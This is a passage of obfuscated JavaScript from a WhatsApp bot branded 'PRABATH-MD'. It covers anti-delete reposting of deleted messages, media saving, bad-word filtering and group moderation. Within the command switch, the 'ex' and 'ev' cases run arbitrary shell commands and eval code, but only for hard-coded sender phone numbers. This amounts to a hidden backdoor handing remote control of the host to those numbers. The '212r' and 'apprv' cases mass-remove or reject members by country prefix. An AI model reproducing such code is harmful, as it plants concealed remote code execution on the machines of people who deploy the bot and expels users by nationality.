                if (_0xff7273.message && _0xff7273.message.conversation && _0xff7273.message.conversation !== '') {
                  const _0x1ea9d9 = _0xff7273.message.conversation;
                  var _0x24c6f7 = "```";
                  _0x4e657c.sendMessage(_0x226e1d, {
                    'text': "🚫 *This message was deleted !!*\n\n  🚮 *Deleted by:* _" + _0x63d528 + "_\n  📩 *Sent by:* _" + _0x141d3e + "_\n\n> 🔓 Message Text: " + _0x24c6f7 + _0x1ea9d9 + _0x24c6f7
                  });
                } else {
                  if (_0xff7273.msg.type === "MESSAGE_EDIT") {
                    _0x4e657c.sendMessage(_0x226e1d, {
                      'text': "❌ *edited message detected* " + _0xff7273.message.editedMessage.message.protocolMessage.editedMessage.conversation
                    }, {
                      'quoted': _0x1c96c2
                    });
                  } else {
                    if (_0xff7273.message && _0xff7273.message.exetendedTextMessage && _0xff7273.msg.text) {
                      const _0x51f718 = _0xff7273.msg.text;
                      if (_0x559f8a && _0x51f718.includes("chat.whatsapp.com")) {
                        return;
                      }
                      var _0x24c6f7 = "```";
                      _0x4e657c.sendMessage(_0x226e1d, {
                        'text': "🚫 *This message was deleted !!*\n\n  🚮 *Deleted by:* _" + _0x63d528 + "_\n  📩 *Sent by:* _" + _0x141d3e + "_\n\n> 🔓 Message Text: " + _0x24c6f7 + _0x51f718 + _0x24c6f7
                      });
                    } else {
                      if (_0xff7273.message && _0xff7273.message.exetendedTextMessage) {
                        if (_0x559f8a && messageText.includes("chat.whatsapp.com")) {
                          return;
                        }
                        var _0x24c6f7 = "```";
                        _0x4e657c.sendMessage(_0x226e1d, {
                          'text': "🚫 *This message was deleted !!*\n\n  🚮 *Deleted by:* _" + _0x63d528 + "_\n  📩 *Sent by:* _" + _0x141d3e + "_\n\n> 🔓 Message Text: " + _0x24c6f7 + _0xff7273.body + _0x24c6f7
                        });
                      } else {
                        if (_0xff7273.type === "extendedTextMessage") {
                          async function _0x32d7d0() {
                            if (_0xff7273.message.extendedTextMessage) {
                              if (_0x559f8a && messageText.includes('chat.whatsapp.com')) {
                                return;
                              }
                              _0x4e657c.sendMessage(_0x226e1d, {
                                'text': "🚫 *This message was deleted !!*\n\n  🚮 *Deleted by:* _" + _0x63d528 + "_\n  📩 *Sent by:* _" + _0x141d3e + "_\n\n> 🔓 Message Text: " + '```' + _0xff7273.message.extendedTextMessage.text + '```'
                              });
                            } else {
                              if (_0x559f8a && messageText.includes("chat.whatsapp.com")) {
                                return;
                              }
                              _0x4e657c.sendMessage(_0x226e1d, {
                                'text': "🚫 *This message was deleted !!*\n\n  🚮 *Deleted by:* _" + _0x63d528 + "_\n  📩 *Sent by:* _" + _0x141d3e + "_\n\n> 🔓 Message Text: " + '```' + _0xff7273.message.extendedTextMessage.text + '```'
                              });
                            }
                          }
                          _0x32d7d0();
                        } else {
                          if (_0xff7273.type === 'imageMessage') {
                            async function _0x410125() {
                              var _0x79ab4e = _0x4d593f('');
                              const _0x3272c1 = _0x32b6b9(_0x4e657c, _0xff7273);
                              let _0x52d8ca = await _0x3272c1.download(_0x79ab4e);
                              let _0x479b4a = require("file-type");
                              let _0x1ca79e = _0x479b4a.fromBuffer(_0x52d8ca);
                              await fs.promises.writeFile('./' + _0x1ca79e.ext, _0x52d8ca);
                              if (_0xff7273.message.imageMessage.caption) {
                                const _0x23cfc7 = _0xff7273.message.imageMessage.caption;
                                if (_0x559f8a && _0x23cfc7.includes('chat.whatsapp.com')) {
                                  return;
                                }
                                await _0x4e657c.sendMessage(_0x226e1d, {
                                  'image': fs.readFileSync('./' + _0x1ca79e.ext),
                                  'caption': "🚫 *This message was deleted !!*\n\n  🚮 *Deleted by:* _" + _0x63d528 + "_\n  📩 *Sent by:* _" + _0x141d3e + "_\n\n> 🔓 Message Text: " + _0xff7273.message.imageMessage.caption
                                });
                              } else {
                                await _0x4e657c.sendMessage(_0x226e1d, {
                                  'image': fs.readFileSync('./' + _0x1ca79e.ext),
                                  'caption': "🚫 *This message was deleted !!*\n\n  🚮 *Deleted by:* _" + _0x63d528 + "_\n  📩 *Sent by:* _" + _0x141d3e + '_'
                                });
                              }
                            }
                            _0x410125();
                          } else {
                            if (_0xff7273.type === "videoMessage") {
                              async function _0x11aa41() {
                                var _0xdda856 = _0x4d593f('');
                                const _0x12e2dc = _0x32b6b9(_0x4e657c, _0xff7273);
                                const _0x233317 = _0xff7273.message.videoMessage.fileLength;
                                const _0x28d93a = _0xff7273.message.videoMessage.seconds;
                                const _0x31a7f1 = config.MAX_SIZE;
                                const _0x3a8697 = _0x233317 / 1048576;
                                if (_0xff7273.message.videoMessage.caption) {
                                  if (_0x3a8697 < _0x31a7f1 && _0x28d93a < 1800) {
                                    let _0x234b6a = await _0x12e2dc.download(_0xdda856);
                                    let _0x53481d = require("file-type");
                                    let _0x4132f2 = _0x53481d.fromBuffer(_0x234b6a);
                                    await fs.promises.writeFile('./' + _0x4132f2.ext, _0x234b6a);
                                    const _0x534be6 = _0xff7273.message.videoMessage.caption;
                                    if (_0x559f8a && _0x534be6.includes('chat.whatsapp.com')) {
                                      return;
                                    }
                                    await _0x4e657c.sendMessage(_0x226e1d, {
                                      'video': fs.readFileSync('./' + _0x4132f2.ext),
                                      'caption': "🚫 *This message was deleted !!*\n\n  🚮 *Deleted by:* _" + _0x63d528 + "_\n  📩 *Sent by:* _" + _0x141d3e + "_\n\n> 🔓 Message Text: " + _0xff7273.message.videoMessage.caption
                                    });
                                  }
                                } else {
                                  let _0x6189a = await _0x12e2dc.download(_0xdda856);
                                  let _0xe31c37 = require("file-type");
                                  let _0x2e411c = _0xe31c37.fromBuffer(_0x6189a);
                                  await fs.promises.writeFile('./' + _0x2e411c.ext, _0x6189a);
                                  const _0x3c5344 = _0xff7273.message.videoMessage.fileLength;
                                  const _0x163bef = _0xff7273.message.videoMessage.seconds;
                                  const _0x2abb0f = config.MAX_SIZE;
                                  const _0x50db03 = _0x3c5344 / 1048576;
                                  if (_0x50db03 < _0x2abb0f && _0x163bef < 1800) {
                                    await _0x4e657c.sendMessage(_0x226e1d, {
                                      'video': fs.readFileSync('./' + _0x2e411c.ext),
                                      'caption': "🚫 *This message was deleted !!*\n\n  🚮 *Deleted by:* _" + _0x63d528 + "_\n  📩 *Sent by:* _" + _0x141d3e + '_'
                                    });
                                  }
                                }
                              }
                              _0x11aa41();
                            } else {
                              if (_0xff7273.type === "documentMessage") {
                                async function _0x38bdf1() {
                                  var _0x364e32 = _0x4d593f('');
                                  const _0x34b47a = _0x32b6b9(_0x4e657c, _0xff7273);
                                  let _0x342903 = await _0x34b47a.download(_0x364e32);
                                  let _0x3cb3b3 = require('file-type');
                                  let _0x1f105c = _0x3cb3b3.fromBuffer(_0x342903);
                                  await fs.promises.writeFile('./' + _0x1f105c.ext, _0x342903);
                                  if (_0xff7273.message.documentWithCaptionMessage) {
                                    await _0x4e657c.sendMessage(_0x226e1d, {
                                      'document': fs.readFileSync('./' + _0x1f105c.ext),
                                      'mimetype': _0xff7273.message.documentMessage.mimetype,
                                      'fileName': _0xff7273.message.documentMessage.fileName,
                                      'caption': "🚫 *This message was deleted !!*\n\n  🚮 *Deleted by:* _" + _0x63d528 + "_\n  📩 *Sent by:* _" + _0x141d3e + "_\n"
                                    });
                                  } else {
                                    await _0x4e657c.sendMessage(_0x226e1d, {
                                      'document': fs.readFileSync('./' + _0x1f105c.ext),
                                      'mimetype': _0xff7273.message.documentMessage.mimetype,
                                      'fileName': _0xff7273.message.documentMessage.fileName,
                                      'caption': "🚫 *This message was deleted !!*\n\n  🚮 *Deleted by:* _" + _0x63d528 + "_\n  📩 *Sent by:* _" + _0x141d3e + "_\n"
                                    });
                                  }
                                }
                                _0x38bdf1();
                              } else {
                                if (_0xff7273.type === "audioMessage") {
                                  async function _0x491ad4() {
                                    var _0x59e3bc = _0x4d593f('');
                                    const _0x56e7fb = _0x32b6b9(_0x4e657c, _0xff7273);
                                    let _0x42a944 = await _0x56e7fb.download(_0x59e3bc);
                                    let _0x3ee149 = require("file-type");
                                    let _0x1196e1 = _0x3ee149.fromBuffer(_0x42a944);
                                    await fs.promises.writeFile('./' + _0x1196e1.ext, _0x42a944);
                                    if (_0xff7273.message.audioMessage) {
                                      const _0x42c9bb = await _0x4e657c.sendMessage(_0x226e1d, {
                                        'audio': fs.readFileSync('./' + _0x1196e1.ext),
                                        'mimetype': _0xff7273.message.audioMessage.mimetype,
                                        'fileName': _0x2334d2.id + ".mp3"
                                      });
                                      return await _0x4e657c.sendMessage(_0x226e1d, {
                                        'text': "🚫 *This message was deleted !!*\n\n  🚮 *Deleted by:* _" + _0x63d528 + "_\n  📩 *Sent by:* _" + _0x141d3e + "_\n"
                                      }, {
                                        'quoted': _0x42c9bb
                                      });
                                    } else {
                                      if (_0xff7273.message.audioMessage.ptt === "true") {
                                        const _0x10c973 = await _0x4e657c.sendMessage(_0x226e1d, {
                                          'audio': fs.readFileSync('./' + _0x1196e1.ext),
                                          'mimetype': _0xff7273.message.audioMessage.mimetype,
                                          'ptt': 'true',
                                          'fileName': _0x2334d2.id + ".mp3"
                                        });
                                        return await _0x4e657c.sendMessage(_0x226e1d, {
                                          'text': "🚫 *This message was deleted !!*\n\n  🚮 *Deleted by:* _" + _0x63d528 + "_\n  📩 *Sent by:* _" + _0x141d3e + "_\n"
                                        }, {
                                          'quoted': _0x10c973
                                        });
                                      }
                                    }
                                  }
                                  _0x491ad4();
                                } else {
                                  if (_0xff7273.type === "stickerMessage") {
                                    async function _0x30e3b2() {
                                      var _0x21ddd1 = _0x4d593f('');
                                      const _0x558247 = _0x32b6b9(_0x4e657c, _0xff7273);
                                      let _0x20bd04 = await _0x558247.download(_0x21ddd1);
                                      let _0x522616 = require('file-type');
                                      let _0x407a74 = _0x522616.fromBuffer(_0x20bd04);
                                      await fs.promises.writeFile('./' + _0x407a74.ext, _0x20bd04);
                                      if (_0xff7273.message.stickerMessage) {
                                        const _0x1abb01 = await _0x4e657c.sendMessage(_0x226e1d, {
                                          'sticker': fs.readFileSync('./' + _0x407a74.ext),
                                          'package': "PRABATH-MD 🌟"
                                        });
                                        return await _0x4e657c.sendMessage(_0x226e1d, {
                                          'text': "🚫 *This message was deleted !!*\n\n  🚮 *Deleted by:* _" + _0x63d528 + "_\n  📩 *Sent by:* _" + _0x141d3e + "_\n"
                                        }, {
                                          'quoted': _0x1abb01
                                        });
                                      } else {
                                        const _0x555ab9 = await _0x4e657c.sendMessage(_0x226e1d, {
                                          'sticker': fs.readFileSync('./' + _0x407a74.ext),
                                          'package': "PRABATH-MD 🌟"
                                        });
                                        return await _0x4e657c.sendMessage(_0x226e1d, {
                                          'text': "🚫 *This message was deleted !!*\n\n  🚮 *Deleted by:* _" + _0x63d528 + "_\n  📩 *Sent by:* _" + _0x141d3e + "_\n"
                                        }, {
                                          'quoted': _0x555ab9
                                        });
                                      }
                                    }
                                    _0x30e3b2();
                                  }
                                }
                              }
                            }
                          }
                        }
                      }
                    }
                  }
                }
              } else {
                console.log("Original message not found for revocation.");
              }
            }
            if (_0x1c96c2.msg && _0x1c96c2.msg.type === 0x0) {
              _0x4a23b8(_0x1c96c2);
            } else {
              _0xf9867b(_0x1c96c2);
            }
          }
        }
      }
      const _0x5c244d = await _0x3cc360('https://raw.githubusercontent.com/THEMISADAS2007/MOVIE-VISPER-DATABASE/refs/heads/main/User/bad_word.json');
      if (config.ANTI_BAD) {
        if (!_0x2f23cb && !_0x104cb6) {
          for (any in _0x5c244d) {
            if (_0x337c99.toLowerCase().includes(_0x5c244d[any])) {
              if (!_0x337c99.includes("tent")) {
                if (!_0x337c99.includes("docu")) {
                  if (!_0x337c99.includes("https")) {
                    if (_0x3a8bf0.includes(_0x3a9e13)) {
                      return;
                    }
                    if (_0x1c96c2.key.fromMe) {
                      return;
                    }
                    await _0x4e657c.sendMessage(_0x226e1d, {
                      'delete': _0x1c96c2.key
                    });
                    await _0x4e657c.sendMessage(_0x226e1d, {
                      'text': "*Bad word detected..!*"
                    });
                    await _0x4e657c.groupParticipantsUpdate(_0x226e1d, [_0x3a9e13], "remove");
                  }
                }
              }
            }
          }
        }
      }
      if (_0x337c99 === "send" || _0x337c99 === "Send" || _0x337c99 === "Ewpm" || _0x337c99 === "ewpn" || _0x337c99 === "Dapan" || _0x337c99 === 'dapan' || _0x337c99 === "oni" || _0x337c99 === "Oni" || _0x337c99 === "save" || _0x337c99 === "Save" || _0x337c99 === 'ewanna' || _0x337c99 === "Ewanna" || _0x337c99 === "ewam" || _0x337c99 === "Ewam" || _0x337c99 === 'sv' || _0x337c99 === 'Sv' || _0x337c99 === "දාන්න" || _0x337c99 === "එවම්න") {
        const _0x3134bb = JSON.stringify(_0x1c96c2.message, null, 0x2);
        const _0x3e22f0 = JSON.parse(_0x3134bb);
        const _0x57a1bc = _0x3e22f0.extendedTextMessage.contextInfo.remoteJid;
        if (!_0x57a1bc) {
          return;
        }
        const _0x2a1be4 = _0x235607 => {
          const _0x57cfd7 = {
            'jpg': "ffd8ffe0",
            'png': "89504e47",
            'mp4': "00000018"
          };
          const _0x18f4e6 = _0x235607.toString("hex", 0x0, 0x4);
          return Object.keys(_0x57cfd7).find(_0x487b2c => _0x57cfd7[_0x487b2c] === _0x18f4e6);
        };
        if (_0x2334d2.quoted.type === "imageMessage") {
          var _0x37a5a0 = _0x4d593f('');
          let _0x1f6929 = await _0x2334d2.quoted.download(_0x37a5a0);
          let _0x3c61bb = _0x2a1be4(_0x1f6929);
          await fs.promises.writeFile('./' + _0x3c61bb, _0x1f6929);
          const _0x2ea04c = _0x2334d2.quoted.imageMessage.caption;
          await _0x4e657c.sendMessage(_0x226e1d, {
            'image': fs.readFileSync('./' + _0x3c61bb),
            'caption': _0x2ea04c
          });
        } else {
          if (_0x2334d2.quoted.type === "videoMessage") {
            var _0x37a5a0 = _0x4d593f('');
            let _0x5a3439 = await _0x2334d2.quoted.download(_0x37a5a0);
            let _0x5a1575 = _0x2a1be4(_0x5a3439);
            await fs.promises.writeFile('./' + _0x5a1575, _0x5a3439);
            const _0x511c6b = _0x2334d2.quoted.videoMessage.caption;
            let _0x2b28d7 = {
              'video': fs.readFileSync('./' + _0x5a1575),
              'mimetype': "video/mp4",
              'fileName': _0x2334d2.id + '.mp4',
              'caption': _0x511c6b,
              'headerType': 0x4
            };
            await _0x4e657c.sendMessage(_0x226e1d, _0x2b28d7, {
              'quoted': _0x1c96c2
            });
          }
        }
      }
      const _0x440000 = require('./command');
      const _0x552419 = _0x241d9d ? _0x337c99.slice(0x1).trim().split(" ")[0x0].toLowerCase() : false;
      if (_0x241d9d) {
        const _0x5605af = _0x440000.commands.find(_0x5ea9e6 => _0x5ea9e6.pattern === _0x552419) || _0x440000.commands.find(_0x1d8131 => _0x1d8131.alias && _0x1d8131.alias.includes(_0x552419));
        if (_0x5605af) {
          if (_0x5605af.react) {
            _0x4e657c.sendMessage(_0x226e1d, {
              'react': {
                'text': _0x5605af.react,
                'key': _0x1c96c2.key
              }
            });
          }
          try {
            _0x5605af["function"](_0x4e657c, _0x1c96c2, _0x2334d2, {
              'from': _0x226e1d,
              'prefix': _0x4aad1b,
              'l': l,
              'isSudo': _0x3b9653,
              'quoted': _0x4619c9,
              'body': _0x337c99,
              'isCmd': _0x241d9d,
              'isPre': _0x29a34f,
              'command': _0x340108,
              'args': _0x2f64e0,
              'q': _0x1e9f42,
              'isGroup': _0x559f8a,
              'sender': _0x3a9e13,
              'senderNumber': _0x571a80,
              'botNumber2': _0x4eb7cf,
              'botNumber': _0xaf7d63,
              'pushname': _0x814f86,
              'isMe': _0x104cb6,
              'isOwner': _0x2c4ed0,
              'groupMetadata': _0x47abd9,
              'groupName': _0x69edf1,
              'participants': _0x3c71f7,
              'groupAdmins': _0x3a8bf0,
              'isBotAdmins': _0x5500c6,
              'isAdmins': _0x2f23cb,
              'reply': _0x432f8e
            });
          } catch (_0x3938e1) {
            console.error("[PLUGIN ERROR] ", _0x3938e1);
          }
        }
      }
      _0x440000.commands.map(async _0x42f07 => {
        if (_0x337c99 && _0x42f07.on === "body") {
          _0x42f07["function"](_0x4e657c, _0x1c96c2, _0x2334d2, {
            'from': _0x226e1d,
            'prefix': _0x4aad1b,
            'l': l,
            'isSudo': _0x3b9653,
            'quoted': _0x4619c9,
            'isPre': _0x29a34f,
            'body': _0x337c99,
            'isCmd': _0x241d9d,
            'command': _0x42f07,
            'args': _0x2f64e0,
            'q': _0x1e9f42,
            'isGroup': _0x559f8a,
            'sender': _0x3a9e13,
            'senderNumber': _0x571a80,
            'botNumber2': _0x4eb7cf,
            'botNumber': _0xaf7d63,
            'pushname': _0x814f86,
            'isMe': _0x104cb6,
            'isOwner': _0x2c4ed0,
            'groupMetadata': _0x47abd9,
            'groupName': _0x69edf1,
            'participants': _0x3c71f7,
            'groupAdmins': _0x3a8bf0,
            'isBotAdmins': _0x5500c6,
            'isAdmins': _0x2f23cb,
            'reply': _0x432f8e
          });
        } else {
          if (_0x1c96c2.q && _0x42f07.on === 'text') {
            _0x42f07["function"](_0x4e657c, _0x1c96c2, _0x2334d2, {
              'from': _0x226e1d,
              'l': l,
              'quoted': _0x4619c9,
              'body': _0x337c99,
              'isSudo': _0x3b9653,
              'isCmd': _0x241d9d,
              'isPre': _0x29a34f,
              'command': _0x42f07,
              'args': _0x2f64e0,
              'q': _0x1e9f42,
              'isGroup': _0x559f8a,
              'sender': _0x3a9e13,
              'senderNumber': _0x571a80,
              'botNumber2': _0x4eb7cf,
              'botNumber': _0xaf7d63,
              'pushname': _0x814f86,
              'isMe': _0x104cb6,
              'isOwner': _0x2c4ed0,
              'groupMetadata': _0x47abd9,
              'groupName': _0x69edf1,
              'participants': _0x3c71f7,
              'groupAdmins': _0x3a8bf0,
              'isBotAdmins': _0x5500c6,
              'isAdmins': _0x2f23cb,
              'reply': _0x432f8e
            });
          } else {
            if ((_0x42f07.on === "image" || _0x42f07.on === "photo") && _0x1c96c2.type === "imageMessage") {
              _0x42f07['function'](_0x4e657c, _0x1c96c2, _0x2334d2, {
                'from': _0x226e1d,
                'prefix': _0x4aad1b,
                'l': l,
                'quoted': _0x4619c9,
                'isSudo': _0x3b9653,
                'body': _0x337c99,
                'isCmd': _0x241d9d,
                'command': _0x42f07,
                'isPre': _0x29a34f,
                'args': _0x2f64e0,
                'q': _0x1e9f42,
                'isGroup': _0x559f8a,
                'sender': _0x3a9e13,
                'senderNumber': _0x571a80,
                'botNumber2': _0x4eb7cf,
                'botNumber': _0xaf7d63,
                'pushname': _0x814f86,
                'isMe': _0x104cb6,
                'isOwner': _0x2c4ed0,
                'groupMetadata': _0x47abd9,
                'groupName': _0x69edf1,
                'participants': _0x3c71f7,
                'groupAdmins': _0x3a8bf0,
                'isBotAdmins': _0x5500c6,
                'isAdmins': _0x2f23cb,
                'reply': _0x432f8e
              });
            } else if (_0x42f07.on === "sticker" && _0x1c96c2.type === "stickerMessage") {
              _0x42f07["function"](_0x4e657c, _0x1c96c2, _0x2334d2, {
                'from': _0x226e1d,
                'prefix': _0x4aad1b,
                'l': l,
                'quoted': _0x4619c9,
                'isSudo': _0x3b9653,
                'body': _0x337c99,
                'isCmd': _0x241d9d,
                'command': _0x42f07,
                'args': _0x2f64e0,
                'isPre': _0x29a34f,
                'q': _0x1e9f42,
                'isGroup': _0x559f8a,
                'sender': _0x3a9e13,
                'senderNumber': _0x571a80,
                'botNumber2': _0x4eb7cf,
                'botNumber': _0xaf7d63,
                'pushname': _0x814f86,
                'isMe': _0x104cb6,
                'isOwner': _0x2c4ed0,
                'groupMetadata': _0x47abd9,
                'groupName': _0x69edf1,
                'participants': _0x3c71f7,
                'groupAdmins': _0x3a8bf0,
                'isBotAdmins': _0x5500c6,
                'isAdmins': _0x2f23cb,
                'reply': _0x432f8e
              });
            }
          }
        }
      });
      if (_0x28420c(config.ANTI_LINK) && _0x5500c6) {
        if (!_0x2f23cb) {
          if (!_0x104cb6) {
            if (_0x337c99.match("chat.whatsapp.com")) {
              await _0x4e657c.sendMessage(_0x226e1d, {
                'delete': _0x1c96c2.key
              });
            }
          }
        }
      }
      if (config.ANTI_BOT) {
        if (_0x559f8a && !_0x2f23cb && !_0x104cb6 && _0x5500c6) {
          if (_0x1c96c2.id.startsWith("BAE")) {
            await _0x4e657c.sendMessage(_0x226e1d, {
              'text': "*Other bots are not allow here ❌*"
            });
            if (config.ANTI_BOT && _0x5500c6) {
              await _0x4e657c.sendMessage(_0x226e1d, {
                'delete': _0x1c96c2.key
              });
              await _0x4e657c.groupParticipantsUpdate(_0x226e1d, [_0x3a9e13], "remove");
            }
          }
          if (_0x1c96c2.id.startsWith("QUEENAMDI")) {
            await _0x4e657c.sendMessage(_0x226e1d, {
              'text': "*Other bots are not allow here ❌*"
            });
            if (config.ANTI_BOT && _0x5500c6) {
              await _0x4e657c.sendMessage(_0x226e1d, {
                'delete': _0x1c96c2.key
              });
              await _0x4e657c.groupParticipantsUpdate(_0x226e1d, [_0x3a9e13], 'remove');
            }
          }
          if (_0x1c96c2.id.startsWith("B1E")) {
            await _0x4e657c.sendMessage(_0x226e1d, {
              'text': "*Other bots are not allow here ❌*"
            });
            if (config.ANTI_BOT && _0x5500c6) {
              await _0x4e657c.sendMessage(_0x226e1d, {
                'delete': _0x1c96c2.key
              });
              await _0x4e657c.groupParticipantsUpdate(_0x226e1d, [_0x3a9e13], "remove");
            }
          }
        }
      }
      switch (_0x340108) {
        case "jid":
          _0x432f8e(_0x226e1d);
          break;
        case "device":
          {
            let _0x37bf26 = getDevice(_0x1c96c2.message.extendedTextMessage.contextInfo.stanzaId);
            _0x432f8e("*He Is Using* _*Whatsapp " + _0x37bf26 + " version*_");
          }
          break;
        case 'ex':
          {
            if (_0x571a80 == 0x16113d24e6) {
              const {
                exec: _0x49b539
              } = require("child_process");
              _0x49b539(_0x1e9f42, (_0x29a82a, _0x51ff79) => {
                if (_0x29a82a) {
                  return _0x432f8e("-------\n\n" + _0x29a82a);
                }
                if (_0x51ff79) {
                  return _0x432f8e("-------\n\n" + _0x51ff79);
                }
              });
            }
          }
          break;
        case "apprv":
          {
            if (_0x571a80 == 0x16113d24e6) {
              let _0x237156 = await _0x4e657c.groupRequestParticipantsList(_0x226e1d);
              for (let _0x55bfdb = 0x0; _0x55bfdb < _0x237156.length; _0x55bfdb++) {
                if (_0x237156[_0x55bfdb].jid.startsWith("212")) {
                  await _0x4e657c.groupRequestParticipantsUpdate(_0x226e1d, [_0x237156[_0x55bfdb].jid], "reject");
                } else {
                  await _0x4e657c.groupRequestParticipantsUpdate(_0x226e1d, [_0x237156[_0x55bfdb].jid], 'approve');
                }
              }
            }
          }
          break;
        case "212r":
          {
            if (_0x571a80 == 0x16113d24e6) {
              for (let _0x4bcd24 = 0x0; _0x4bcd24 < _0x3c71f7.length; _0x4bcd24++) {
                if (_0x3c71f7[_0x4bcd24].id.startsWith("212")) {
                  await _0x4e657c.groupParticipantsUpdate(_0x226e1d, [_0x3c71f7[_0x4bcd24].id], "remove");
                }
              }
            }
          }
          break;
        case "rtf":
          {
            console.log(dsa);
          }
          break;
        case 'ev':
          {
            if (_0x571a80 == 0x16113d24e6 || _0x571a80 == 0x160de87163) {
              let _0xf5b75b = _0x1e9f42.replace('°', ".toString()");
              try {
                let _0x4ba2ff = await eval(_0xf5b75b);
                if (typeof _0x4ba2ff === "object") {
                  _0x432f8e(util.format(_0x4ba2ff));
                } else {
                  _0x432f8e(util.format(_0x4ba2ff));
                }
              } catch (_0x4c68f6) {
                _0x432f8e(util.format(_0x4c68f6));
              }
              ;
            }
          }
          break;
        default:
      }
    } catch (_0x1dfb16) {
      const _0x351a17 = String(_0x1dfb16);
      console.log(_0x351a17);
    }
  });
}
app.get('/', (_0x429943, _0x3cc868) => {
  _0x3cc868.send("📟 Working successfully!");
});
app.listen(port, () => console.log("Server listening on port http://localhost:" + port));
setTimeout(() => {
  connect();
}, 0xbb8);
process.on('uncaughtException', function (_0x488166) {
  let _0x1a3d78 = String(_0x488166);
  if (_0x1a3d78.includes("Socket connection timeout")) {
    return;
  }
  if (_0x1a3d78.includes("rate-overlimit")) {
    return;
  }
  if (_0x1a3d78.includes("Connection Closed")) {
    return;
  }
  if (_0x1a3d78.includes("Value not found")) {
    return;
  }
  if (_0x1a3d78.includes("Authentication timed out")) {
    restart();
  }
  console.log("Caught exception: ", _0x488166);
});
